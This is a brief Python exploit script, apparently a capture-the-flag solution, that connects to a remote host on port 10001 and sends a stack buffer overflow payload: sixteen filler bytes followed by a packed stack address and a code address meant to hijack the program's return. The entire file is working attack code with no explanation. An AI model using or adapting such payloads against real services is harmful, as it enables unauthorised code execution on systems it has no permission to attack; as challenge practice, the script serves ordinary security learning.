import socket
a=socket.socket()
addr=('aurora.52szu.tech', 10001)
a.connect(addr)
c='\x08'*16
print(a.recv(100))
a.send(c.encode()+int('ffffd398',base=16).to_bytes(4,'little')+int('0804851B',base=16).to_bytes(4,'little')+'\n'.encode())
print(a.recv(100))
print(a.recv(100))